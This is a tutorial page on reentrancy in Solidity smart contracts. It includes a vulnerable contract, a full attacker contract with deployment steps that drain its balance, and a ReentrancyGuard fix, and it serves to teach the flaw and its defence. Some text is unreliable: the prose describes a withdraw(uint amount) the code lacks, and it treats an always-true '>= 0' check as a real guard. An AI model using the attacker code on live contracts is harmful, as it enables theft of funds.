# Re-Entrancy

## Introduction

<hr>

`Reentrancy` is a vulnerability in smart contracts that occurs when a contract calls an external contract and the external contract calls back into the original contract before the original contract has completed its execution. This can create a loop where the same function is executed repeatedly, potentially leading to unintended consequences such as transferring more funds than intended, locking up the contract, or other unexpected behavior.

## Understanding Reentrancy

<hr>

To understand how `reentrancy` works, let's consider a simple example. 

Suppose we have two contracts: `Contract A` and `Contract B`.

`Contract A` is a smart contract that holds user funds and allows users to withdraw them. It contain functions for checking balances, transferring funds, and verifying that the sender of a transaction has sufficient funds. The general structure of the contract's withdraw function is shown in the image below:

<center><img class="image w30" src="./assets/images/re-entrance-1.jpg"></center>
<b><center class="img-label">Contract A</center></b>

According to the image, `Contract A` has `50 Ether` in funds. The `withdraw()` function first checks whether the user's balance is greater than `zero`. If it is, the contract sends the associated funds to the user and sets the user's balance to `zero`. For example, let's say `Bob` has a balance of `20 Ether` stored in this contract and wants to withdraw his funds. He can use the contract's `withdraw` function to request the funds. The function will check if `Bob` has a balance stored in the contract (he does, with `20 Ether`). The contract will then send the balance back to `Bob`, reducing the contract's balance to `30 Ether` (`50 Ether` minus `20 Ether`). Finally, the contract sets Bob's balance to `zero`. This is how the withdraw function works.

Now Let's examine how `Contract B`, an attacker contract, can exploit the `Contract A's` withdraw function:

`Contract B` has two functions: a `fallback function` and a function called `attack`. Both functions call the `withdraw` function within `Contract A`. At the beginning of the attack, `Contract B` has `zero` Ether in funds. The general structure of the contract's `attack` and `fallback` function is shown in the image below:

<center><img class="image w30" src="./assets/images/re-entrancy-1a.jpg"></center>
<b><center class="img-label">Contract B</center></b>

**The execution of these functions works as follows:**

Assuming `Alice` deposited `10 ether` to `Contract A` through `Contract B`, `Contract A` is aware that `Contract B` has `10 ether`. Subsequently, Alice calls the `attack()` function, which calls the `withdraw()` function in `Contract A`. Contract A verifies that `Contract B` address has a balance greater than `zero` as a condition to proceed with the function call.

<center><img class="image w90" src="./assets/images/re-entrance-2.jpg"></center>
<b><center class="img-label">Calling attack() function</center></b>

`Contract A` confirms that `Contract B` has a balance greater than `zero` (which is `10 Ether`), and proceeds with the function call. `Contract A `then sends the `10 Ether` back to `Contract B`, which triggers the `fallback` function of `contract B`.

<center><img class="image w90" src="./assets/images/re-entrance-3.jpg"></center>
<b><center class="img-label">Transfer of funds from Contract A to Contract B</center></b>

At this point, the current state of the contracts is that `Contract B` has a balance of `10 Ether`, while the balance of `Contract A` is reduced to `40 Ether`. However, it is important to note that the execution of `Contract B's` `fallback` function is still pending, and the execution of `Contract A's withdraw()` function is also pending (Due to this the balance of `Contract B` in the `contract A` state remains at `10 Ether`).

The `fallback` function of `Contract B` invokes the `withdraw()` function in `Contract A` once more. Upon invocation, `Contract A` verifies that `Contract B's` balance is still greater than `zero`, which is true (It currently holds `10 Ether`), and proceeds to transfer an additional `10 Ether`  to `Contract B`.

<center><img class="image w90" src="./assets/images/re-entrance-4.jpg"></center>
<b><center class="img-label">Transfer of funds from Contract A to Contract B</center></b>

At this point, the current state of the contracts is that `Contract B` has a balance of `20 Ether`, while the balance of `Contract A` is reduced to `30 Ethe`r. Tt is important to note that the execution of `Contract B's fallback` function is again still pending, and the execution of `Contract A's withdraw()` function is also pending.

This cycle can repeat, with the `fallback` function in `Contract B` repeatedly calling the `withdraw()` function in `Contract A`. Each time this happens, `Contract A` sends additional funds to `Contract B`, causing the balance of `Contract A` to decrease and `Contract B's` balance to increase. This is how `Contract B` can continuously exploit the `withdraw()` function of `Contract A`.

<center><img class="image w90" src="./assets/images/re-entrance-5.jpg"></center>
<b><center class="img-label">Transfer of funds from Contract A to Contract B</center></b>

In this attack, `Contract B` repeatedly calls the withdraw function of `Contract A` in a loop without waiting for the previous transaction to complete. As a result, the balance of the user in `Contract A` is not updated before the next withdrawal, allowing the attacker to repeatedly withdraw funds from `Contract A`.

In conclusion, a reentrancy attack is a type of vulnerability that can occur in smart contracts when a contract is allowed to call back into itself or another contract before the first invocation has completed. This can be exploited by attackers to repeatedly execute a vulnerable function and drain funds from the contract.

## POC

<hr>

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

contract VulnerableContract {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        require(balances[msg.sender] >= 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
}
```

This is a simple smart contract called `VulnerableContract` that allows users to deposit and withdraw ether. The contract has three functions:

**1. deposit():** This function allows anyone to deposit ether into the contract. The amount of ether deposited by the sender is added to their balance in the balances mapping.

**2. withdraw(uint amount):** This function allows a user to withdraw a specified amount of ether from their balance in the balances mapping. It first checks if the user has a sufficient balance to withdraw the specified amount by using the require statement. If the user has sufficient balance, the function attempts to transfer the specified amount of ether to the user's address using the call function. If the transfer is successful, the specified amount is subtracted from the user's balance in the balances mapping.

**3. getBalance():** This function allows a user to check their balance in the balances mapping. It returns the balance of the caller (the address that calls the function).

Note that this contract is vulnerable to a reentrancy attack. If an attacker were to call the `withdraw()` function from a malicious contract that implements a `fallback` or `receive` function that calls back into the vulnerable contract, the attacker could repeatedly call the `withdraw()` function and drain the contract's balance. 

Now we will create a `POC` of the `VulnerableContract` that exploits its vulnerability to a reentrancy attack. We will then use the `POC` to demonstrate how the vulnerability can be exploited to drain the contract's balance.

To create the `AttackerContract`, we first need to create an instance of the `VulnerableContract`. We do this by passing the address of the deployed `VulnerableContract` to the constructor of the `AttackerContract`.

```sol
contract AttackerContract {
    VulnerableContract vulnerableContract;

    constructor(VulnerableContract _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }
}
```

Next, we need to create a `fallback` function that is called whenever someone sends ether to the `AttackerContract`. In this `fallback` function, we check if the balance of the `VulnerableContract` is greater than or equal to `1 ether`. If it is, we call the `withdraw` function of the `VulnerableContract`.

```sol
fallback() external payable {
    if (address(vulnerableContract).balance >= 1 ether) {
        vulnerableContract.withdraw();
    }
}
```

The `fallback` function in the `AttackerContract` is payable, which means that it can receive ether when it is called. This is important because the `AttackerContract` needs to be able to receive ether in order to deposit it into the `VulnerableContract` and then withdraw it repeatedly. The reason we create a `fallback` function in the `AttackerContract` is that it is called automatically when ether or calldata is sent to the contract, allowing us to exploit the `vulnerability`.

Finally, we need to create an `attack` function that deposits `1 ether` to the `VulnerableContract` and then calls the `withdraw` function of the `VulnerableContract`. 

Since the balance of a newly created account in `VulnerableContract` is `0`, if we were to call the `withdraw` function without first depositing any funds, the require statement would prevent us from withdrawing any ether. Therefore, we need to deposit some ether into the contract to satisfy the require statement and pass the check. In this particular case, we are depositing `1 ether`, but the amount could be any positive number greater than 0 to satisfy the check. 

```sol
function attack() public payable {
    vulnerableContract.deposit{value: 1 ether}();
    vulnerableContract.withdraw();
}
```

The `attack` function can be called by anyone, and it will drain the balance of the `VulnerableContract` if it has at least `1 ether`.
We can also create a `getBalance` function to check the balance of the `AttackerContract`.

In this case, the `attack()` function sends `1 ether` to the `VulnerableContract` using the `deposit()` function, which is a payable function. Therefore, the attack() function must be marked as payable to receive the 1 ether that is being sent to it.

By marking the function as payable, we are allowing it to receive `ether` and we can then use that `ether` to call the `deposit()` function of the `VulnerableContract` and deposit `1 ether` into the contract before calling the `withdraw()` function.

```sol
function getBalance() public view returns (uint) {
    return address(this).balance;
}
```

In conclusion, the `AttackerContract` POC demonstrates how a simple vulnerability in a smart contract can be exploited to drain the contract's balance. It is important for developers to thoroughly test and audit their smart contracts to ensure that they are secure and free from vulnerabilities.

**Final AttackerContract Code Snippet:**

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

contract AttackerContract {
    VulnerableContract vulnerableContract;

    constructor(VulnerableContract _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }
    
    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw();
        }
    }
     
    function attack() public payable {
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## Exploit

<hr>

Here's a summary of the steps involved in a re-entrancy attack:

**1.** First, you need to deploy a vulnerable contract.

**2.** Deposit some money into the vulnerable contract using an externally owned account (EOA), in order to create a balance that can be attacked.

**3.** Deploy an attacker contract that takes the vulnerable contract address as a parameter.

**4.** Call the attacker contract's `attack` function with a value of `1 ether`, in order to trigger the attack.

**5.** The `attack` function will call the vulnerable contract's function that interacts with an external contract.

**6.** The vulnerable contract will attempt to transfer funds to the attacker contract using the call low-level function. This triggers the fallback function in the attacker contract, allowing the attacker to execute further code and potentially steal more funds.

**7.** The fallback function in the attacker contract will repeatedly call the vulnerable contract's withdraw function, effectively re-entering the vulnerable contract's code.

**8.** The re-entrancy attack will continue until the vulnerable contract's balance is depleted, potentially causing damage to the contract's logic and allowing the attacker to steal more funds than they deposited.

<center><img class="image" src="./assets/images/single-function-re-entrancy.jpg"></center>
<b><center class="img-label">Attack flaw</center></b>

<div class="doc-note">
	<p class="alert alert-primary"><b>Note:</b> 
       Some people believe that the Reentrancy hack is no longer possible in Solidity such as <a href="https://stackoverflow.com/questions/67722470/reentrancy-hack-in-solidity-no-longer-working-on-pragma-0-8-0" target="_blank">https://stackoverflow.com/questions/67722470/reentrancy-hack-in-solidity-no-longer-working-on-pragma-0-8-0</a>. This belief may have arisen from the fact that some individuals attempted to test this exploit on Remix IDE, which had some issues in the past. However, these issues have now been resolved by Remix IDE. You can currently try testing the exploit on Remix IDE, but there is no guarantee that future issues with Remix IDE will not arise. If the exploit does not work on Remix IDE, you can try testing it on other platforms. If you encounter any issues, you can ask on our Discord server.
    </p>
</div>

## Preventing Re-Entrancy Attacks 

<hr>

To prevent `re-entrancy` attacks, it is necessary to use a custom implementation such as the `ReentrancyGuard` contract. This modifier ensures that a function can only be called once at a time, thereby preventing an attacker from calling it repeatedly before the initial call is completed.

```sol
abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}
```

The `ReentrancyGuard` contract contains a single variable called `locked`, which is a boolean that keeps track of whether the function is currently being executed.

The `noReentrant` modifier is defined in this contract, and it is used to prevent re-entrancy attacks on functions that are susceptible to them. When a function is marked with this modifier, it first checks that locked is false. If locked is true, then the function will throw an exception with the message `"No re-entrancy"`. If locked is false, the function will set locked to true, execute the function code (`_`), and then set locked back to false.

By doing this, the modifier ensures that the function can only be called once at a time, preventing re-entrancy attacks where an attacker can call the same function multiple times before the first call has completed.

To demonstrate the use of the `ReentrancyGuard` contract and the `noReentrant` modifier, let's modify a vulnerable contract to prevent re-entrancy attacks. 

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract VulnerableContract is ReEntrancyGuard {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public noReentrant {
        require(balances[msg.sender] >= 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return balances[msg.sender];
    }
}
```


## Types of Re-Entrancy Attacks

<hr> 

**1.** Single-Function Reentrancy : This type of attack occurs when a single function in a contract is called multiple times before the previous call completes which we have already discussed above.

**2.** Cross-Function Reentrancy

**3.** Cross-Contract Reentrancy

**4.** Cross-Chain Reentrancy

**5.** Read-Only Reentrancy

In the next section, we will focus on these remaining types of re-entrancy attacks and examine how they can be carried out.
